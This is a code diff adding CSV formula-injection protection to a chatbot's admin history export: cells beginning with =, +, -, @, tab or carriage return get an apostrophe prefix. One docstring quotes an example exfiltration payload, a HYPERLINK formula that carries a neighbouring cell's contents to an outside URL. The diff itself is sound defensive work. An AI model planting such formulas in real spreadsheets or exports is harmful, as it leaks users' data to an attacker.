@@ -829,6 +829,36 @@ def admin_topics():
         return jsonify({"error": str(e)}), 500
 
 
+# Characters that start a formula in Excel, LibreOffice and Google Sheets.
+# A leading tab or carriage return counts too: both are stripped by the
+# spreadsheet before the cell is parsed, so "\t=cmd" arrives as "=cmd".
+FORMULA_LEADERS = ("=", "+", "-", "@", "\t", "\r")
+
+
+def csv_safe(value):
+    """One field, made inert for a spreadsheet.
+
+    The csv module quotes correctly, which keeps a comma or a newline from
+    tearing a record apart — but quoting is about the file's structure, and
+    the risk here is about what happens after the file is parsed. Excel,
+    LibreOffice and Sheets all treat a cell beginning with = + - or @ as a
+    formula and evaluate it on open.
+
+    Every row of this export is text a stranger typed into a public chat box,
+    read back by an administrator in a spreadsheet. A message of
+    `=HYPERLINK("https://...?c="&A1,"Click")` is not a message any more; it
+    is a link that carries the row beside it out to whoever sent it.
+
+    A leading apostrophe is the spreadsheets' own escape: it is consumed on
+    open and the rest of the cell is shown as written. It is visible in the
+    formula bar, which is the honest trade — the alternative is a cell that
+    runs.
+    """
+    text = "" if value is None else str(value)
+
+    return f"'{text}" if text.startswith(FORMULA_LEADERS) else text
+
+
 @app.route("/admin/history/export", methods=["GET"])
 def export_history():
     """EXPORT — the transcript as a CSV file.
@@ -856,12 +886,17 @@ def export_history():
         # csv handles the quoting. Replies routinely contain commas, quotes
         # and newlines, and hand-joining these fields would tear a single
         # answer across several rows.
+        #
+        # csv_safe handles what quoting cannot: the two text columns are
+        # whatever a visitor typed, and a spreadsheet runs a cell that opens
+        # with an equals sign. The id and the timestamp are written by this
+        # application and never start with one.
         for record in records:
             writer.writerow([
                 record.get("id", ""),
                 record.get("created_at", ""),
-                record.get("user_message", ""),
-                record.get("bot_response", ""),
+                csv_safe(record.get("user_message", "")),
+                csv_safe(record.get("bot_response", "")),
             ])
 
         # The filename says what is in the file, so a folder of exports can
